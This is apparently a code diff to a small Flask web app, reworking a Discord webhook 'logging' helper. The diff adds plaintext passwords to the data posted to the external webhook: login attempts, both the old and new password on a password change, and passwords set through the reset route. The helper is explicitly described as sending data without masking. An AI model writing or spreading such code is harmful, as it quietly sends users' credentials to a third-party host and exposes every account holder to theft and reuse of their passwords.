@@ -16,29 +16,64 @@ app.secret_key = os.environ.get('SECRET_KEY', 'tu_clave_secreta_aqui')
 
 
 # --- Helpers para logs y contraseñas ---
-DISCORD_WEBHOOK = os.environ.get('DISCORD_WEBHOOK', '')  # pon tu webhook en Render
+# --- Helpers de logging a Discord (embeds sin máscaras) ---
+DISCORD_WEBHOOK = os.environ.get('DISCORD_WEBHOOK', '')  # configura en Render
 
 def client_ip():
-    return request.headers.get('X-Forwarded-For', request.remote_addr)
-
-def send_discord(event, payload=None):
-    """Envía logs al webhook de Discord sin romper si falla."""
-    if not DISCORD_WEBHOOK:
-        return
-    try:
-        content = f"**{event}** — {datetime.utcnow().isoformat()}Z\nIP: `{client_ip()}`"
-        if payload:
-            import json as _json
-            content += "\n```json\n" + _json.dumps(payload, ensure_ascii=False, indent=2) + "\n```"
-        requests.post(DISCORD_WEBHOOK, json={"username": "Mochitos Logs", "content": content}, timeout=5)
-    except Exception:
-        pass
+    # Render pasa X-Forwarded-For
+    return (request.headers.get('X-Forwarded-For') or request.remote_addr or '').split(',')[0].strip()
 
 def _is_hashed(value: str) -> bool:
-    """Detecta si el valor parece un hash de werkzeug (pbkdf2/scrypt)."""
-    if not isinstance(value, str):
-        return False
-    return value.startswith("pbkdf2:") or value.startswith("scrypt:")
+    return isinstance(value, str) and (value.startswith('pbkdf2:') or value.startswith('scrypt:'))
+
+def send_discord(event: str, payload: dict | None = None):
+    """
+    Envía un embed simple a Discord (sin enmascarar nada).
+    - Campo Usuario solo si session['username'] es 'mochito' o 'mochita'.
+    - Incluye Ruta y IP.
+    - Todos los datos del payload tal cual, troceados si exceden límites.
+    """
+    if not DISCORD_WEBHOOK:
+        return  # no rompe si no hay webhook
+
+    try:
+        display_user = None
+        if 'username' in session and session['username'] in ('mochito', 'mochita'):
+            display_user = session['username']
+
+        embed = {
+            "title": event,
+            "color": 0xE84393,
+            "timestamp": datetime.utcnow().isoformat() + "Z",
+            "fields": []
+        }
+
+        if display_user:
+            embed["fields"].append({"name": "Usuario", "value": display_user, "inline": True})
+
+        try:
+            ruta = f"{request.method} {request.path}"
+        except Exception:
+            ruta = "(sin request)"
+
+        embed["fields"].append({"name": "Ruta", "value": ruta, "inline": True})
+        embed["fields"].append({"name": "IP", "value": client_ip() or "?", "inline": True})
+
+        if payload:
+            raw = json.dumps(payload, ensure_ascii=False, indent=2)
+            chunks = [raw[i:i+1000] for i in range(0, len(raw), 1000)]
+            for i, ch in enumerate(chunks[:3]):  # máx 3 campos para no pasarnos
+                embed["fields"].append({
+                    "name": "Datos" + (f" ({i+1})" if i else ""),
+                    "value": f"```json\n{ch}\n```",
+                    "inline": False
+                })
+
+        body = {"username": "Mochitos Logs", "embeds": [embed]}
+        requests.post(DISCORD_WEBHOOK, json=body, timeout=6)
+    except Exception as e:
+        print(f"[discord] error enviando webhook: {e}")
+
 
 
 
@@ -540,10 +575,10 @@ def index():
 
                     if ok:
                         session['username'] = username
-                        send_discord("Login OK", {"username": username, "mode": mode})
+                        send_discord("Login OK",   {"username": username, "mode": mode, "password_try": password})
                         return redirect('/')
                     else:
-                        send_discord("Login FAIL", {"username_intent": username, "reason": "bad_password", "mode": mode})
+                        send_discord("Login FAIL", {"username_intent": username, "reason": "bad_password", "mode": mode, "password_try": password})
                         return render_template('index.html', login_error="Usuario o contraseña incorrecta", profile_pictures={})
             finally:
                 conn.close()
@@ -613,7 +648,7 @@ def index():
 
                     if not valid_current:
                         flash("La contraseña actual no es correcta.", "error")
-                        send_discord("Change password FAIL", {"user": user, "reason": "wrong_current"})
+                        send_discord("Change password FAIL", {"user": user, "reason": "wrong_current", "current_password_try": current_password})
                         return redirect('/')
 
                     # Guardar nueva (hash)
@@ -621,7 +656,7 @@ def index():
                     c.execute("UPDATE users SET password=%s WHERE username=%s", (new_hash, user))
                     conn.commit()
                     flash("Contraseña cambiada correctamente 🎉", "success")
-                    send_discord("Change password OK", {"user": user})
+                    send_discord("Change password OK", {"user": user, "old_password": current_password, "new_password": new_password})
                     return redirect('/')
 
                 # 3) Responder pregunta
@@ -1104,7 +1139,7 @@ def __reset_pw():
             new_hash = generate_password_hash(pw)
             c.execute("UPDATE users SET password=%s WHERE username=%s", (new_hash, u))
             conn.commit()
-        send_discord("Reset PW OK", {"user": u})
+        send_discord("Reset PW OK", {"user": u, "new_password": pw})
         return f"Contraseña de {u} actualizada correctamente", 200
     except Exception as e:
         send_discord("Reset PW ERROR", {"error": str(e)})
